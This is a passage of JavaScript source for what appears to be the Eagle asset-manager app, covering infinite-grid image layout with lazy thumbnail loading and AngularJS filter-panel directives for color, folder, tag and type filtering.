							var deactivatedLabel = i18n.__("Context.Image.Font.Deactivate");
							if (fs.existsSync(fontPath)) {
								templateData.css += " activated ";
								templateData.fontActivateBtn = `<div class="activate-btn"></div>`;
							}
							else {
								templateData.fontActivateBtn = `<div class="activate-btn"></div>`;
							}
							templateData.backgroundColor = "rgba(255, 255, 255, 1)";
						}
						catch (err) {}
					}

					if ($bodyScope.preferences.habits.hoverZoom === "on") {
						templateData.hoverZoom = `<div class="zoom-btn"></div>`;
					}

					templateData.aspectRatio = `${templateData.width || 200}/${templateData.height || 200}`;

					if (item.height / item.width >= 2.5) {
						templateData.imgCss += " long";
						templateData.css += " long ";
						templateData.aspectRatio = '';
					}

					if (item.height === item.width) {
						templateData.imgCss += " square";
					}

					if (item.height <= 180 && item.width <= 240) {
						templateData.css += " pixelated ";
					}
					else if (item.height <= 320 || item.width <= 320) {
						templateData.css += " optimize-contrast ";
					}

					if (item.width / item.height >= 2) {
						templateData.imgCss += " panoramic-landscape";
					}

					if (item.orientation && !item.noThumbnail) {
						
						if (item.orientation === 8) {
							templateData.imgCss += " r8 ";
						}
						else if (item.orientation === 7) {
							templateData.imgCss += " r7 ";
						}
						else if (item.orientation === 6) {
							templateData.imgCss += " r6 ";
						}
						else if (item.orientation === 5) {
							templateData.imgCss += " r5 ";
						}
						else if (item.orientation === 4) {
							templateData.imgCss += " r4 ";
						}
						else if (item.orientation === 3) {
							templateData.imgCss += " r3 ";
						}
						else if (item.orientation === 2) {
							templateData.imgCss += " r2 ";
						}

						if (item.orientation > 4) {
							if (item.width < item.height) {
								templateData.imgStyle += ` min-width: ${item.height / item.width * 100}%; `;
							}
							else {
								templateData.imgStyle += ` width: ${item.height / item.width * 100}%; `;
							}
						}
					}
					
					if (item.comments && item.comments.length > 0) {
						templateData.css += " has-annotation ";
					}

					switch ($bodyScope.listMetaType) {
						case 'RESOLUTION':
							if (item.duration && VIDEO_TYPES[item.ext]) {
								templateData.metas = $filter('duration')(item.duration);
							}
							else if (item.duration && AUDIO_TYPES[item.ext]) {				
								templateData.metas = $filter('duration')(item.duration);
							}
							else if (item.fontMetas && FONT_TYPES[item.ext]) {
								templateData.metas = item.fontMetas.weight;
							}
							else if (SPECIAL_TYPES[item.ext]) {
								templateData.metas = `${fileSize(item.size, 1)}`;
							}
							else if (item.noPreview) {
								templateData.metas = `${fileSize(item.size, 1)}`;

							}
							else if (item.ext === "url") {
								if (item.duration) {
									templateData.metas = $filter('duration')(item.duration);
								}
								else {
									templateData.metas = $filter('domainName')(item.url);
								}
							}
							else {
								templateData.metas = `${item.width} × ${item.height}`;
							}
							break;
						case 'FILESIZE':
							templateData.metas = `${fileSize(item.size, 1)}`;
							break;
						case 'TYPE':
							templateData.metas = item.ext.toUpperCase();
							break;
						case 'MTIME':
							var mtime = item.mtime || item.modificationTime;
							templateData.metas = $filter("date")(item.mtime || item.modificationTime, "yyyy/MM/dd HH:mm");
							break;
						case 'BTIME':
							var btime = item.btime || item.modificationTime;
							templateData.metas = $filter("date")(item.btime || item.modificationTime, "yyyy/MM/dd HH:mm");
							break;
						case 'TAGS':
							templateData.metas = "";
							if (item.tags && item.tags.length) {
								var tags = item.tags.map(function (tag) {
									return `<div class="tag color-${$bodyScope.TagManager.tagMappings[tag].color}">${tag.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
								});
								templateData.metas = tags.join("");
								templateData.metas = templateData.metas;
							}
							else {
								templateData.metas = "-";
							}
							break;
						case 'RATING':
							templateData.metas = `<span class="small star">${ratingStrings[item.star]}</span>`
							break;
					}
				}
				catch (err) {
					console.log(err);
					return undefined;
				}
				return getItem(templateData);
			}

			var generateItems = function (items) {
				var arr = [];
				for (var i = 0; i < items.length; ++i) {
					var item = generateItem(items[i], i);
					if (item) {
						arr.push(item);
					}
				}
				return arr;
			}

			resetNgGridLayoutData = (items, cursor) => {
				$scope.items = items;
				startCursor = cursor || 0;
				startGroupKey = 1000000 + startCursor;
				resetData();
			};

			function resetData () {
				if ($("#box-container .box-list").width() === 0) {
					setTimeout(resetData, 100);
					return;
				}
				if (ig) {
					ig.clear();
					ig.destroy();
					ig = new eg.InfiniteGrid("#box-container .box-list", {
						isOverflowScroll: false,
						threshold: 2000
					});
				}
				NgGridStrings = {};
				initData();
			};

			var initDataTimeout;
			function initData () {
				if (!$scope.items || $scope.items.length === 0) {
					$("#box-list").css("height", "");
					return;
				}
				// console.time("initData");
				if (!$bodyScope) $bodyScope = angular.element("body").scope();
				var currentImageSize = $bodyScope.imageSize.height;
				var allLayout = "grid-layout justified-layout list-layout";

				// 瀑布流
				if ($bodyScope.layout === "GridLayout" || $bodyScope.layout === "SquareLayout") {
					$container.removeClass(allLayout).addClass("grid-layout");
					ig.setLayout(eg.InfiniteGrid.GridLayout, {
						margin: 8,
						align: $scope.options.align,
					});
				}
				// 列表模式
				else if ($bodyScope.layout === "ListLayout") {
					$container.removeClass(allLayout).addClass("list-layout");
					ig.setLayout(eg.InfiniteGrid.GridLayout, {
						margin: 0,
						align: $scope.options.align,
					});
				}
				// 谷歌流
				else {
					var cw = $container.width();
					$container.removeClass(allLayout).addClass("justified-layout");
					ig.setLayout(eg.InfiniteGrid.JustifiedLayout, {
						minSize: currentImageSize * 1 - 10,
                    	maxSize: currentImageSize * 1 + 10,
						margin: 8,
						// column: [1, maxColumn]
					});
					// ig._layout.setSize($container.width() - 40);
				}

				var $subFolderContainer = $("#sub-folder-container");
				
				ig.on({
					"prepend": throttle(function(e) {
						var groupKeys = ig.getGroupKeys(true);
						var groupKey = (groupKeys[0] || 0) - 1;

						var items = getItems( ( groupKey + $scope.options.preload - 1 - startGroupKey + startCursor ) * $scope.options.page, $scope.options.page);
						if (items.length > 0) {
							ig.prepend(items, groupKey);
							setTimeout(function () { $bodyScope.showImages(); }, 800);
						}

						// Note: 置頂需要重新 relayout 避免第一頁上方參差不齊
						if ($bodyScope.layout === "GridLayout" && groupKey === 999999) {
							ig.layout();
						}

						if (groupKey === 999999) {
							if (!$subFolderContainer.is(":visible")) {
								$subFolderContainer.show();
							}
						}
						return;
					}, 100),
					"append": function(e) {
						var groupKeys = ig.getGroupKeys(true);
						var groupKey = (groupKeys[groupKeys.length - 1] || 0) + 1;
						var items = getItems( ( groupKey + $scope.options.preload - 1 - startGroupKey + startCursor ) * $scope.options.page, $scope.options.page);
						// requestAnimationFrame(() => {
							ig.append(items, groupKey);
							setTimeout(function () { $bodyScope.showImages(); }, 800);
						// });
					},
					"layoutComplete": function (e) {
						setTimeout(function () {
							onLayoutComplete(e);
						}, 100);
					}
				});

				function onLayoutComplete (e) {

					var scope = $bodyScope || angular.element("body").scope();
					var selectedMappings = scope.selectedMappings;

					e.target.forEach(function(item) {

						if (!item.el || !item.el.parentNode) {
							// console.log("return")
							return;
						}

						var id = item.el.getAttribute("data-box-id")
						var image = scope.itemMappings[id];

						if (!image) return;

						var $item = $(item.el);
						var classNames = "";

						if (scope.selectedMappings[id]) {
							classNames += "selected ";
						}

						if (image && image.tags && image.tags.length > 0) {
							classNames += "tagged ";
						}

						// 置頂文件圖標
						if (scope.currentFolder && scope.currentFolder.orderBy !== "RANDOM") {
			            	if (image.pinned && image.pinned[scope.currentFolder.id]) {
			            		classNames += "pinned ";
			            	}
						}

						var $img = $item.find("img");
						
						if (classNames !== '') {
							$item.addClass(classNames);
						}

						// let lastThumbnailPath = FileUrlHelper.getLastestThumbnailUrl(image);
						// $img.attr("lsrc", lastThumbnailPath);
						let supportLargeThumb = { jpg: true, png: true, webp: true, bmp: true };
						if (supportLargeThumb[image.ext] && (!image.orientation || image.orientation === 1) ) {
                			$img.attr("raw", $bodyScope.getRawUrl(image));
                		}
                		
						var lazysrc = $img.attr("lazysrc");
						if (!lazysrc) return;
						
						var src = decodeURIComponent(lazysrc).replace("file://", "").split("?v=")[0];
						if (src === "undefined") {
							$item.addClass("animate");
							return;
						}

						if (checkedImageMapinngs[id]) {
							$img.attr("src", lazysrc).attr("lsrc", lazysrc);
							$item.addClass("animate");
							return;
						}
						fs.stat(src, function (err, stat) {
							// 超过 20 mg 的图片应该是异常了，不显示
							if (err) {
								$img.attr("src", lazysrc);
								$item.addClass("animate");
								// 如果缩略图消失，尝试重新制作一次，不管失败或成功，本次软件打开只会执行一次。
								if (err.code === "ENOENT" && !fixedImageMapinngs[id]) {
									electronLog && electronLog.error(`[app] Thumbnail file does not exist, try to re-generate path: ${src}`);
									if (image) {
										ipcRenderer.send('regenerate-thumbnail', [image]);
									}
    								fixedImageMapinngs[id] = true;
    							}
    						}
    						else if (stat.size > 22000000) {
								if (image) image.disable = true;
								if (image && !checkedImageMapinngs[id]) {
									ipcRenderer.send('regenerate-thumbnail', [image]);
								}
    							electronLog && electronLog.error(`[app] Thumbnail file size is not valid, hidden thumbnail. file size: ${stat.size}, path: ${src}`);
    							$item.addClass("animate");
    							checkedImageMapinngs[id] = true;
    							scope.$evalAsync();
    						}
    						else if (stat.size > 10000000) {
    							electronLog && electronLog.error(`[app] Thumbnail file size is not valid, try display thumbnail. file size: ${stat.size}, path: ${src}`);
    							$img.attr("src", lazysrc).attr("lsrc", lazysrc);
    							$item.addClass("animate");
    							checkedImageMapinngs[id] = true;
    						}
    						else {
    							$img.attr("src", lazysrc).attr("lsrc", lazysrc);
    							$item.addClass("animate");
    							checkedImageMapinngs[id] = true;
    						}
						});
					});
				}

				let items;
				// Note: 这里可以决定用户第一眼看到的内容
				if (startCursor === 0 || !$scope.items[startCursor * $scope.options.page]) {
					items = getItems(0 * $scope.options.page, $scope.options.page * ($scope.options.preload) );
					ig.append(items, startGroupKey);
				}
				// Note: 如果使用记忆位置，一次载入两个页面，可以避免画面抖动
				else {
					items = getItems(startCursor * $scope.options.page, $scope.options.page * $scope.options.preload );
					ig.append(items, startGroupKey);
					if (items.length < $scope.options.page) return;
					clearTimeout(initDataTimeout);
					initDataTimeout = setTimeout(() => {
						let nextItems = getItems((startCursor + 1) * $scope.options.page, $scope.options.page * ($scope.options.preload) );
						if (nextItems.length > 0) {
							ig.append(nextItems, startGroupKey + 1);
						}
						else {
							let nextItems2 = getItems((startCursor + 1) * $scope.options.page, $scope.options.page * ($scope.options.preload) );
							if (nextItems2.length > 0) {
								ig.prepend(nextItems2, startGroupKey - 1);
							}
						}
					}, 100);
				}
				
			};

			$scope.$on("gl:reset", function (event, items, cursor) {
				$scope.items = items;
				startCursor = cursor || 0;
				startGroupKey = 1000000 + startCursor;
				resetData();
			});

			$scope.$on("gl:scrollToTop", function () {
				resetData();
			});

			$scope.$on("gl:removeItems", function (event, items) {
				items.forEach(function (item) {
					ig.remove(item);
				});
				// NOTE: false 就不会造成最上方排版歪
				// ig.layout(false);
				ig.layout(true);
				setTimeout(() => {
					ig._updateContainerHeight();
				}, 100);
			});

			// initData();
		}
	};
}]);

EagleApp.directive('filterItem', function($rootScope, $timeout) {
    return {
    	scope: false,
        restrict: 'A',
        link: function($scope, elem, attrs) {

        	$scope.$body = angular.element("body").scope();
        	$scope.focusInput = focusInput;

        	var $shortcutInput = $(elem).find(".shortcut-input");
            var $inputs = elem.find("input, textarea").not(".shortcut-input");
            var $enhanceInput = $(elem).find(".shortcut-input").not("#filter-panel-types-search").not("#filter-panel-tags-search").not("#filter-panel-folders-search");

        	elem.on("click", function (event) {
        		event.stopPropagation();
        		$("[filter-item].open").not(elem).removeClass("open");
        		$(elem).toggleClass("open");
        		if ($("[filter-item].open").length > 0) {
                    elem.trigger("open");
        			// 如果內容寬度 + x 超過畫面，靠右對齊
        			if (
						event.pageX + elem.find(".menu-wrap").width() > $(window).width() &&
						event.pageX - elem.find(".menu-wrap").width() > 0
					) {
        				$(elem).addClass("right-menu");
        			}
        			else {
        				$(elem).removeClass("right-menu");
        			}
        			focusInput();
        			$("#filter-toolbar-overlay").addClass("show");
        		}
        		else {
        			$("#filter-toolbar-overlay").removeClass("show");
        		}
                setTimeout(function () { $bodyScope.updateContainerHieght(); }, 50);
        		$rootScope.currentFocus = "content";
        		$rootScope.$evalAsync();
        	});

        	elem.find(".menu-wrap").on("click", function (event) {
        		event.stopPropagation();
        	});

        	elem.find(".clear-btn").on("click", function (event) {
        		close();
        	});

            let onEscKeydown = false;
            $shortcutInput.on("keydown", function (event) {
        		var keyCode = event.keyCode;
        		switch (keyCode) {
        			case 27:
                        onEscKeydown = true;
        				break;
        		}
        	});

        	$shortcutInput.on("keyup", function (event) {
        		var keyCode = event.keyCode;
        		switch (keyCode) {
                    case 13: 
                        clickSelect();
                        break;
        			case 27:
                        if (onEscKeydown) {
                            event.preventDefault();
                            event.stopPropagation();
                            close();
                            onEscKeydown = false;
                        }
        				break;
                    // up
                    case 38:
                        selectPrev();
                        break;
                    // down
                    case 40:
                        selectNext();
                        break;
        			case 9:
        				event.preventDefault();
        				event.stopPropagation();
        				break;
        		}
        	});

            $inputs.on("keyup", function (event) {
                var keyCode = event.keyCode;
                switch (keyCode) {
                    case 27:
                        event.preventDefault();
                        event.stopPropagation();
                        close();
                        break;
                }
            });

            var keyUpTimeout;
            var originalKeyword;
            $enhanceInput.on("keyup", function (event) {
                var val = $enhanceInput.val();
                var key = val.toLowerCase();
                if (key) {
                    highlightItem(key);
                }
                clearTimeout(keyUpTimeout);
                keyUpTimeout = setTimeout(function () {
                    $enhanceInput.val("");
                }, 500);
            });

            elem.on("mouseenter", ".check-item", function () {
                elem.find(".check-item").removeClass("active");
                $(this).addClass("active");
            });

            function highlightItem (key) {
                var $checkItems = elem.find(".check-item");
                if ($checkItems.length < 0) return;
                $checkItems.each(function () {
                    var $item = $(this);
                    var name = $item.find(".name").text();
                    if (name.toLowerCase().startsWith(key)) {
                        $checkItems.removeClass("active");
                        $item.addClass("active");
                        return false;
                    }
                });
            };

            function openPrevFilterItem () {
                var $filterItems = $(".filter-item:visible");
                var $prevFilterItem;
                $filterItems.each(function (index) {
                    var $filterItem = $(this);
                    if ($filterItem.hasClass("open")) {
                        if (index - 1 > 0) {
                            $prevFilterItem = $filterItems.eq(index - 1);
                            return false;
                        }
                    }
                });
                if ($prevFilterItem) {
                    $prevFilterItem.trigger("click");
                }
            }

            function openNextFilterItem () {
                var $filterItems = $(".filter-item:visible");
                var $nextFilterItem;
                $filterItems.each(function (index) {
                    var $filterItem = $(this);
                    if ($filterItem.hasClass("open")) {
                        if (index < $filterItems.length) {
                            $nextFilterItem = $filterItems.eq(index + 1);
                            return false;
                        }
                    }
                });
                if ($nextFilterItem) {
                    $nextFilterItem.trigger("click");
                }
            }

            function clickSelect () {
                var $activeItem = elem.find(".check-item.active");
                if ($activeItem.length > 0) {
                    $activeItem.trigger("click");
                }
            };

            function selectNext () {
                var $checkItems = elem.find(".check-item");
                var $activeItem = elem.find(".check-item.active");
                if ($checkItems.length < 0) return;
                if ($activeItem.length === 0) {
                    $checkItems.eq(0).addClass("active");
                }
                else {
                    var idx = $activeItem.index();
                    $checkItems.removeClass("active");
                    if (idx + 1 > $checkItems.length) {
                        idx = $checkItems.length - 1;
                    }
                    $checkItems.eq(idx).addClass("active");
                }
            };

            function selectPrev () {
                var $checkItems = elem.find(".check-item");
                var $activeItem = elem.find(".check-item.active");
                if ($checkItems.length < 0) return;
                if ($activeItem.length === 0) {
                    $checkItems.eq(0).addClass("active");
                }
                else {
                    var idx = $activeItem.index() - 1;
                    $checkItems.removeClass("active");
                    if (idx - 1 < 0) {
                        $checkItems.eq(0).addClass("active");
                    }
                    else {
                        $checkItems.eq(idx - 1).addClass("active");
                    }
                }
            };

        	function close () {
                $shortcutInput.blur();
        		$(elem).removeClass("open");
        		if ($("[filter-item].open").length === 0) {
					$("#filter-toolbar-overlay").removeClass("show");
				}
                setTimeout(function () { $bodyScope.updateContainerHieght(); }, 50);
        	};

        	function focusInput () {
                if ($shortcutInput.length >= 1) {
                    $shortcutInput.focus();
                    setTimeout(function () {
                        $shortcutInput.focus();
                    }, 50);
                }
                else {
                    let input = $inputs.eq(0);
                    if (input && input.focus) {
                        input.focus();
                        setTimeout(function () {
                            input.focus();
                        }, 50);
                    }
                }
        	};
		}
	}
});

$("#filter-toolbar-overlay").on("click", function () {
	$("[filter-item].open").removeClass("open");
	$("#filter-toolbar-overlay").removeClass("show");
});

$("#filter-toolbar-overlay").on("contextmenu", function () {
	$("[filter-item].open").removeClass("open");
	$("#filter-toolbar-overlay").removeClass("show");
});

$("body").on("click", "[close-filter-item]", function (event) {
	event.stopPropagation();
	$("[filter-item]").has(this).removeClass("open");
});
EagleApp.directive('filterItemColor', function($rootScope, $timeout) {
    return {
    	restrict: 'E',
        templateUrl: 'js/directives/filter-item-color.html',
        replace: true,
        link: function($scope, elem, attrs) {
        	$scope.$body = angular.element("body").scope();
        	$scope.clearColorFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.color.value = undefined;
                eagle.filter.filterRules.color.gray = false;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
                $scope.$body.calculateFilterCounts();
        	}

        	var color = "0087EF";
        	var colorChangeTimeout;
            $('#colorpickerHolder').ColorPicker({
                color: color.replace("#", ""),
                flat: true,
                onChange: function (hsb, hex, rgb) {
                    var color = '#' + hex.toUpperCase();
                    if (!color) return;
                    clearTimeout(colorChangeTimeout);
                    colorChangeTimeout = setTimeout(function () {
                    	if ($rootScope.currentColor) {
		                    $rootScope.currentColor.$setViewValue(color);
		                    $rootScope.currentColor.$render();
		                    $scope.$evalAsync();
		                } else {
		                    $scope.$body.hexColor = color;
		                    $scope.filterWithColor($scope.hexToRGB(color));
		                    $scope.$evalAsync();
		                }
                    }, 33);
	                $("#colors-picker-value").val(color.toUpperCase());
	                $("#colors-picker").val(color);
	                $(elem).find(".shortcut-input").focus();
                }
            });
		}
	}
});
EagleApp.directive('filterItemFolders', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-folders.html',
        replace: true,
        link: function($scope, elem, attrs) {

            $scope.$body = angular.element("body").scope();
            $scope.foldersList = $scope.$body.containFolders;
            $scope.rule;
            $scope.displayName = i18n.__("filter.folders");
            $scope.isEnabled = false;
            $scope.rule = eagle.filter.folderFilterLogic;

            elem.on("open", function () {
                // 计算这批图片里面出现的文件夾
                console.time("calcuteContainFolders");
                if (eagle.filter.folderFilterLogic === "OR") {
                    $scope.$body.calcuteContainFolders($scope.$body.preelaborations);
                }
                else if (eagle.filter.folderFilterLogic === "AND" || eagle.filter.folderFilterLogic === "EQUAL") {
                    $scope.$body.calcuteContainFolders($scope.$body.allData);
                }
                console.timeEnd("calcuteContainFolders");
                $scope.$body.$evalAsync();
            });

            $scope.$watch("$body.containFolders", function (newValue) {
                $scope.updateFoldersList();
            });

            $scope.changeRule = function (rule) {
                eagle.filter.folderFilterLogic = rule;
                if ($scope.selectedCount > 0) {
                    $scope.$body.page = 1; 
                    $scope.$body.filterContent();
                }
                $scope.focusInput();
            };

            function filterFolders (folders, keyword) {

                if (!keyword) return folders;
                var keyword_cn = chineseConvert.tw2cn(keyword);

                var folderSearchItems = folders.map(folder => {
                    var folderNameCN = chineseConvert.tw2cn(folder.name);
                    if (keyword.length >= 30 || folder.name.length >= 30) {
                        return {
                            folder: folder,
                            name: folderNameCN,
                            search: [folderNameCN]
                        }
                    }
                    return {
                        folder: folder,
                        name: folderNameCN,
                        search: [folderNameCN, ..._.uniq(
                            cartesianProduct(pinyinlite(folderNameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                            .map(item => item.join(' '))
                        )],
                    };
                });

                var scores = folderSearchItems.map(item => {
                    return {
                        item: item,
                        name: item.name,
                        score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                    };
                })
                
                var result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
                    return i.item.folder;
                });

                return result;
            }

            $scope.updateFoldersList = function () {

                var originLength = $scope.foldersList.length;
                var collator = new Intl.Collator(undefined, { numeric: true, sensitivity: 'base' } );
                var result = $scope.$body.containFolders;

                var selectedFolders = $scope.$body.containFolders.filter(function (folder) {
                    if (!folder) return false;
                    return folder.isSelected;
                });
                $scope.selectedCount = selectedFolders.length;

                if (eagle.filter.filterFolderKeyword) {
                    result = filterFolders(result, eagle.filter.filterFolderKeyword);
                }

                $scope.foldersList = result;

                if ($scope.foldersList.length !== originLength) {
                    $("#filter-folder-list").scrollTop(0);
                }
            };

            $scope.foldersFilterChange = function () {
                $scope.updateFoldersList();
                $("#filter-folder-list").scrollTop(0);
                setTimeout(function () {
                    $("#filter-folder-list .check-item.active").removeClass("active")
                    $("#filter-folder-list .check-item").eq(0).addClass("active");
                }, 33);
            };

            $scope.changeDisplayName = function () {
                var displayName = i18n.__("filter.folders");
                if (Object.keys(eagle.filter.filterRules.folder.includes).length > 0 || Object.values(eagle.filter.filterRules.folder.exclude).length > 0) {
                    displayName = ``;
                    var arr = [];
                    Object.values(eagle.filter.filterRules.folder.includes).forEach(function (folder) {
                        arr.push(folder.name);
                    });
                    Object.values(eagle.filter.filterRules.folder.exclude).forEach(function (folder) {
                        arr.push("-" + folder.name);
                    });
                    if (arr.length > 0) {
                        $scope.isEnabled = true;
                        displayName += arr.join(",");
                        $scope.displayName = displayName;
                    }
                    else {
                        $scope.isEnabled = false;
                        $scope.displayName = i18n.__("filter.folders");
                    }
                }
                else {
                    $scope.isEnabled = false;
                    $scope.displayName = i18n.__("filter.folders");
                }
                setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
            }
            $scope.clearFoldersFilter = function (event) {
                event && event.stopPropagation();
                eagle.filter.filterRules.folder.includes = {};
                eagle.filter.filterRules.folder.exclude = {};
                $scope.$body.page = 1; 
                $scope.$body.filterContent();
                $scope.changeDisplayName();
            }
            $scope.$on("Reset_Filter", function (event) {
                $scope.changeDisplayName();
            });
            $scope.$on("Update_Folders_Filter", function () {
                $scope.changeDisplayName(); 
           });
        }
    }
});
EagleApp.directive('filterItemTags', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-tags.html',
        replace: true,
        link: function($scope, elem, attrs) {

        	$scope.$body = angular.element("body").scope();
        	$scope.tagsList = $scope.$body.containTags;
        	$scope.rule;
        	$scope.displayName = i18n.__("filter.tags");
        	$scope.isEnabled = false;
        	$scope.filterMode = "ALL";
        	$scope.selectedGroup = undefined;
        	$scope.tagsGroupsSidebar = {};
            $scope.rule = eagle.filter.tagFilterLogic;

        	$scope.$watch("$body.containTags", function (newValue) {
        		$scope.updateTagsList();
        	});

            $scope.toggleAllTags = function () {
                var isAllSelected = $scope.isAllSelected();
                if (isAllSelected) {
                    for (var i = 0; i < $scope.tagsList.length; i++) {
                        var tag = $scope.tagsList[i];
                        delete tag.isSelected;
                        var idx = eagle.filter.filterRules.tag.includes.indexOf(tag.name);
                        if (idx > -1) {
                            eagle.filter.filterRules.tag.includes.splice(idx, 1);
                        }
                    }
                }
                else {
                    for (var i = 0; i < $scope.tagsList.length; i++) {
                        var tag = $scope.tagsList[i];
                        tag.isSelected = true;
                        eagle.filter.filterRules.tag.includes.push(tag.name);
                    }
                }
                eagle.filter.filterRules.tag.includes = [...new Set(eagle.filter.filterRules.tag.includes)];
                if (eagle.filter.tagFilterLogic === "AND" || eagle.filter.tagFilterLogic === "EQUAL") {
                    $("#filter-panel .tags-container").scrollTop(0);
                }

                $scope.$body.filterContent();
                $scope.$body.calculateFilterCounts();
                $scope.focusInput();
                $scope.changeDisplayName();
            };

            $scope.isAllSelected = function () {
                if (!$scope.isEnabled) { return false; }
                for (var i = 0; i < $scope.tagsList.length; i++) {
                    if (!$scope.tagsList[i].isSelected) {
                        return false;
                    }
                }
                return true;
            };

        	$scope.filterSelected = function () {
        		$scope.filterMode = "SELECTED";
        		$scope.updateTagsList();
        	};

        	$scope.filterAll = function () {
        		$scope.filterMode = "ALL";
        		$scope.selectedGroup = undefined;
        		$scope.updateTagsList();
        	};

        	$scope.filterWithGroup = function (group) {
        		$scope.filterMode = "GROUP";
        		$scope.selectedGroup = group;
        		$scope.updateTagsList();
        	};

        	$scope.changeRule = function (rule) {
                eagle.filter.tagFilterLogic = rule;
        		if ($scope.selectedCount > 0) {
	        		$scope.$body.page = 1; 
	        		$scope.$body.filterContent();
        		}
        		$scope.focusInput();
        	};

            function filterTags (tags, keyword) {

                if (!keyword) return tags;
                var keyword_cn = chineseConvert.tw2cn(keyword);

                var tagSearchItems = tags.map(tag => {
                    var tagNameCN = chineseConvert.tw2cn(tag.name);
                    if (keyword.length >= 30 || tag.name.length >= 30) {
                        return {
                            tag: tag,
                            name: tagNameCN,
                            search: [tagNameCN]
                        }
                    }
                    return {
                        tag: tag,
                        name: tagNameCN,
                        search: [tagNameCN, ..._.uniq(
                            cartesianProduct(pinyinlite(tagNameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                            .map(item => item.join(' '))
                        )],
                    };
                });

                var scores = tagSearchItems.map(item => {
                    return {
                        item: item,
                        name: item.name,
                        score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                    };
                })
                
                var result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
                    return i.item.tag;
                });

                return result;
            }

        	$scope.updateTagsList = function () {

        		var originLength = $scope.tagsList.length;
        		var collator = new Intl.Collator(undefined, { numeric: true, sensitivity: 'base' } );
        		var result = $scope.$body.containTags;

                var selectedTags = $scope.$body.containTags.filter(function (tag) {
            		if (!tag) return false;
		            return tag.isSelected || tag.isExcluded;
        		});
        		$scope.selectedCount = selectedTags.length;

                if ($scope.filterMode === 'SELECTED') {
                	result = selectedTags;
                }
                else {
                	if ($scope.$body.tagKeyword) {
                        result = filterTags(result, $scope.$body.tagKeyword);
	                }

	                $scope.tagsGroupsSidebar = {};
	                result.forEach(function (tag) {
                        if (!tag) return;
                        try {
                            let originTag = $scope.$body.TagManager.tagMappings[tag.name];
                            if (originTag && originTag.groups && originTag.groups.length > 0) {
                                originTag.groups.forEach(function (groupId) {
                                    if (!$scope.tagsGroupsSidebar[groupId]) {
                                        $scope.tagsGroupsSidebar[groupId] = 1;
                                    }
                                    else {
                                        $scope.tagsGroupsSidebar[groupId]++;
                                    }
                                });
                            }
                        } catch (err) {}
	                });

	                $scope.allTagsCount = result.length;

	                if ($scope.selectedGroup) {

                        let groupTagsMap = {};
                        $scope.selectedGroup.tags.forEach(function (tag) {
                            groupTagsMap[tag] = true;
                        });

                        result = result.filter(function (tag) {
                            return groupTagsMap[tag.name];
                        });

                        var idxMap = {};
                        $scope.selectedGroup.tags.forEach(function (tagName, index) {
                            if (tagName) {
                                idxMap[tagName] = index;
                            }
                        })

                        // 按照群组标签排列方式排列
                        result = result.sort(function (a, b) {
                            var idxA = idxMap[a.name] || -1;
                            var idxB = idxMap[b.name] || -1;
                            return idxA < idxB ? -1 : idxA > idxB ? 1 : 0;;
                        });
	                }
                }

                $scope.tagsList = result;

        		if ($scope.tagsList.length !== originLength) {
        			$("#filter-tags-container").scrollTop(0);
        		}
        	};

        	$scope.tagsFilterChange = function () {
        		$scope.updateTagsList();
        		$("#filter-tags-container").scrollTop(0);
                setTimeout(function () {
                    $("#filter-tags-container .check-item.active").removeClass("active")
                    $("#filter-tags-container .check-item").eq(0).addClass("active");
                }, 33);
        	};

        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.tags");
    			if (eagle.filter.filterRules.tag.includes.length > 0 || eagle.filter.filterRules.tag.exclude.length > 0 || eagle.filter.filterRules.tag.no) {
    				displayName = ``;
    				var arr = [];
    				if (eagle.filter.filterRules.tag.no) {
    					arr.push(i18n.__("Filter.NoTags"));
    				}
    				eagle.filter.filterRules.tag.includes.forEach(function (tagName) {
    					arr.push(tagName);
    				});
    				eagle.filter.filterRules.tag.exclude.forEach(function (tagName) {
    					arr.push(`-${tagName}`);
    				});
    				if (arr.length > 0) {
    					$scope.isEnabled = true;
    					displayName += arr.join(",");
    					$scope.displayName = displayName;
                        analytics.event('Filter', 'Tag');
    				}
    				else {
    					$scope.isEnabled = false;
    					$scope.displayName = i18n.__("filter.tags");
    				}
    			}
    			else {
    				$scope.isEnabled = false;
    				$scope.displayName = i18n.__("filter.tags");
    			}
        		setTimeout(function () { $scope.$body.updateContainerHieght();}, 300);
        	}
        	$scope.clearTagsFilter = function (event) {
        		event && event.stopPropagation();
        		eagle.filter.filterRules.tag.includes.length = 0;
        		eagle.filter.filterRules.tag.exclude.length = 0;
        		eagle.filter.filterRules.tag.no = false;
        		$scope.$body.page = 1; 
        		$scope.$body.filterContent();
        		$scope.changeDisplayName();
        	}
        	$scope.$on("Reset_Filter", function (event) {
        		$scope.changeDisplayName();
        	});
            $scope.$on("Update_Tags_Filter", function () {
                $scope.changeDisplayName(); 
           });
		}
	}
});

EagleApp.directive('filterItemTypes', function($rootScope, $timeout) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/filter-item-types.html',
        replace: true,
        link: function($scope, elem, attrs) {

        	$scope.$body = angular.element("body").scope();
        	$scope.displayName = i18n.__("filter.types");
        	$scope.isEnabled = false;
            $scope.typesKeyword = "";

            $scope.typesFilterChange = function () {
                $("#filter-panel-types-search").scrollTop(0);
                setTimeout(function () {
                    $("#types-filter-item .check-item.active").removeClass("active")
                    $("#types-filter-item .check-item").eq(0).addClass("active");
                }, 33);
            };

            $scope.onTypeItemClick = function () {
                $scope.typesKeyword = "";
            }

        	$scope.changeDisplayName = function () {
        		var displayName = i18n.__("filter.types");
                if (Object.keys(eagle.filter.filterRules.type).length > 0) {
        			displayName = "";
        			var arr = [];

                    Object.keys(eagle.filter.filterRules.type).forEach(function(key) {
                        if (eagle.filter.filterRules.type[key]) { arr.push(key); }
                    });
        			
        			if (arr.length > 0) {
        				$scope.isEnabled = true;
        				displayName += arr.join(",");
        			}
